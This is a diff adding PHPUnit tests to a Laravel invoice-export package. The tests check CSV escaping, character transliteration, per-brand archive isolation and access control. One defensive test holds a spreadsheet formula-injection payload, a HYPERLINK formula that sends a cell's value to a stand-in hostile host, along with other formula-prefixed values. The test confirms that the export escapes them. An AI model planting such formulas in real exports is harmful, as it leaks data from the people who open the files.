@@ -5,6 +5,7 @@ namespace Goldnead\Invoices\Tests\Feature;
 use Goldnead\Invoices\Console\Commands\ExportInvoices;
 use Goldnead\Invoices\Contracts\PdfRenderer;
 use Goldnead\Invoices\Cp\Exports;
+use Goldnead\Invoices\Export\ArchiveStore;
 use Goldnead\Invoices\Export\CsvExport;
 use Goldnead\Invoices\Export\CsvFormat;
 use Goldnead\Invoices\Export\Period;
@@ -18,8 +19,10 @@ use Illuminate\Contracts\Console\Kernel;
 use Illuminate\Foundation\Http\Middleware\ValidateCsrfToken;
 use Illuminate\Http\Request;
 use Illuminate\Support\Carbon;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Queue;
 use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\Schema;
 use Illuminate\Support\Facades\Storage;
 use Inertia\ServiceProvider;
 use PHPUnit\Framework\Attributes\Test;
@@ -559,5 +562,206 @@ class ExportForTheBooksTest extends TestCase
 
         $this->assertNotNull($daten['error']);
         $this->assertStringContainsString($daten['error'], $html);
+    }
+
+    // ── Gauntlet, round 2 ───────────────────────────────────────────────────────
+
+    /**
+     * A brand-context manager that runs several brands and is looking at one.
+     */
+    private function markeAktiv(int $id): void
+    {
+        $this->app->instance('brand-context', new class($id)
+        {
+            public function __construct(private int $id) {}
+
+            public function multiBrandEnabled(): bool
+            {
+                return true;
+            }
+
+            public function currentId(): int
+            {
+                return $this->id;
+            }
+
+            public function current(): object
+            {
+                return (object) ['id' => $this->id, 'name' => 'Marke '.$this->id];
+            }
+        });
+    }
+
+    #[Test]
+    public function a_cell_that_a_spreadsheet_would_run_is_written_as_text(): void
+    {
+        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]], [
+            'buyer_name' => '=HYPERLINK("https://boese.example/?d="&A1;"Rechnung")',
+            'buyer_email' => '+49@example.com',
+            'buyer_vat_id' => '-DE123',
+        ]);
+        $original = Invoice::query()->where('number', 'RE-1')->first();
+        $this->beleg('RE-2', '2026-08-11 12:00', [[1900, 10000, 1900]], [
+            'kind' => Invoice::KIND_CREDIT_NOTE,
+            'reverses_invoice_id' => $original->id,
+            'meta' => ['reverses_number' => '@SUM(1+1)'],
+            'buyer_name' => "\tTab",
+        ]);
+
+        $zeilen = $this->zeilen($this->csv(Period::month('2026-08')));
+        $a = array_combine($zeilen[0], $zeilen[1]);
+        $b = array_combine($zeilen[0], $zeilen[2]);
+
+        $this->assertSame("'=HYPERLINK(\"https://boese.example/?d=\"&A1;\"Rechnung\")", $a['Kunde']);
+        $this->assertSame("'+49@example.com", $a['E-Mail']);
+        $this->assertSame("'-DE123", $a['USt-IdNr.']);
+        $this->assertSame("'@SUM(1+1)", $b['Bezug']);
+        $this->assertSame("'\tTab", $b['Kunde']);
+        $this->assertSame('-100,00', $b['Netto'], 'Betraege bleiben Zahlen, auch mit Minus');
+    }
+
+    #[Test]
+    public function names_outside_windows_1252_are_spelled_in_latin_whatever_the_locale(): void
+    {
+        $vorher = setlocale(LC_ALL, '0');
+        setlocale(LC_ALL, 'C');
+
+        try {
+            $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]], ['buyer_name' => 'Łukasz Żółć']);
+            $this->beleg('RE-2', '2026-08-11 12:00', [[1900, 10000, 1900]], ['buyer_name' => 'Ağaoğlu Müller']);
+
+            $csv = $this->csv(Period::month('2026-08'), CsvFormat::fromOptions(['encoding' => 'windows-1252']));
+        } finally {
+            setlocale(LC_ALL, (string) $vorher);
+        }
+
+        $this->assertStringContainsString("Lukasz Z\xF3lc", $csv, 'o mit Akut gibt es in Windows-1252, der Rest wird lateinisch');
+        $this->assertStringContainsString("Agaoglu M\xFCller", $csv);
+        $this->assertStringNotContainsString('?', $csv);
+    }
+
+    #[Test]
+    public function the_csv_follows_the_invoice_date_not_the_order_of_writing(): void
+    {
+        $this->beleg('RE-B', '2026-08-20 12:00', [[1900, 10000, 1900]]);
+        $this->beleg('RE-A', '2026-08-05 12:00', [[1900, 10000, 1900]]);
+
+        $nummern = array_column(array_slice($this->zeilen($this->csv(Period::month('2026-08'))), 1), 1);
+
+        $this->assertSame(['RE-A', 'RE-B'], $nummern);
+    }
+
+    #[Test]
+    public function the_brand_column_names_the_brand(): void
+    {
+        Schema::create('brands', function ($t) {
+            $t->id();
+            $t->string('handle');
+            $t->string('name');
+            $t->timestamps();
+        });
+        DB::table('brands')->insert(['id' => 2, 'handle' => 'chorwerk', 'name' => 'Chorwerkstatt Nord']);
+        $this->beleg('RE-1', '2026-08-10 12:00', [[1900, 10000, 1900]], ['brand_id' => 2]);
+
+        $zeilen = $this->zeilen($this->csv(Period::month('2026-08')));
+
+        $this->assertSame('Chorwerkstatt Nord', array_combine($zeilen[0], $zeilen[1])['Marke']);
+    }
+
+    #[Test]
+    public function the_screen_lists_the_archives_of_its_own_brand_only(): void
+    {
+        $this->cpRouten();
+        Storage::fake('local');
+        $this->markeAktiv(2);
+        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31_marke-2.zip', 'PK');
+        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31_marke-3.zip', 'PK');
+        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31.zip', 'PK');
+
+        $daten = app(Exports::class)(Request::create('/', 'GET', ['month' => '2026-08']));
+
+        $this->assertSame(['Belege_2026-08-01_2026-08-31_marke-2.zip'], array_column($daten['archives']['ready'], 'name'));
+    }
+
+    #[Test]
+    public function another_brands_archive_is_not_there(): void
+    {
+        $this->cpRouten();
+        Storage::fake('local');
+        $this->markeAktiv(2);
+        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31_marke-3.zip', 'PK');
+        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31_marke-2.zip', 'PK');
+
+        $this->actingAs($this->chefin())
+            ->get(cp_route('utilities.invoice-exports.download', ['file' => 'Belege_2026-08-01_2026-08-31_marke-3.zip']))
+            ->assertNotFound();
+
+        $this->actingAs($this->chefin())
+            ->get(cp_route('utilities.invoice-exports.download', ['file' => 'Belege_2026-08-01_2026-08-31_marke-2.zip']))
+            ->assertOk();
+    }
+
+    #[Test]
+    public function the_file_name_says_which_brand_it_belongs_to(): void
+    {
+        $this->cpRouten();
+        $this->markeAktiv(2);
+
+        $antwort = $this->actingAs($this->chefin())
+            ->get(cp_route('utilities.invoice-exports.csv', ['month' => '2026-08']));
+
+        $this->assertStringContainsString('Belege_2026-08-01_2026-08-31_marke-2.csv', (string) $antwort->headers->get('content-disposition'));
+
+        $bericht = $this->actingAs($this->chefin())
+            ->get(cp_route('utilities.invoice-exports.report', ['month' => '2026-08']));
+
+        $this->assertStringContainsString('Steuerbericht_2026-08-01_2026-08-31_marke-2.csv', (string) $bericht->headers->get('content-disposition'));
+    }
+
+    #[Test]
+    public function the_report_and_the_download_refuse_a_user_without_the_utility_too(): void
+    {
+        $this->cpRouten();
+        Storage::fake('local');
+        Storage::disk('local')->put('invoices/exports/Belege_2026-08-01_2026-08-31.zip', 'PK');
+        $jemand = User::make()->id('jemand')->email('jemand@example.com');
+
+        $this->actingAs($jemand)
+            ->get(cp_route('utilities.invoice-exports.report', ['month' => '2026-08']))
+            ->assertForbidden();
+
+        $this->actingAs($jemand)
+            ->get(cp_route('utilities.invoice-exports.download', ['file' => 'Belege_2026-08-01_2026-08-31.zip']))
+            ->assertForbidden();
+    }
+
+    #[Test]
+    public function a_job_the_worker_gave_up_on_is_shown_as_failed(): void
+    {
+        Storage::fake('local');
+
+        (new BuildPdfArchive('2026-08-01', '2026-08-31', null))->failed(new \RuntimeException('Zeit abgelaufen'));
+
+        $liste = ArchiveStore::make()->listing(null);
+
+        $this->assertSame([], $liste['pending']);
+        $this->assertSame('Belege_2026-08-01_2026-08-31.zip', $liste['failed'][0]['name']);
+        $this->assertStringContainsString('Zeit abgelaufen', $liste['failed'][0]['reason']);
+    }
+
+    #[Test]
+    public function a_marker_older_than_the_job_may_run_is_shown_as_failed(): void
+    {
+        Storage::fake('local');
+        Storage::disk('local')->put(
+            'invoices/exports/Belege_2026-08-01_2026-08-31.zip.pending',
+            now()->subSeconds((new BuildPdfArchive('2026-08-01', '2026-08-31'))->timeout + 60)->toIso8601String(),
+        );
+        Storage::disk('local')->put('invoices/exports/Belege_2026-07-01_2026-07-31.zip.pending', now()->toIso8601String());
+
+        $liste = ArchiveStore::make()->listing(null);
+
+        $this->assertSame(['Belege_2026-07-01_2026-07-31.zip'], $liste['pending']);
+        $this->assertSame('Belege_2026-08-01_2026-08-31.zip', $liste['failed'][0]['name']);
     }
 }
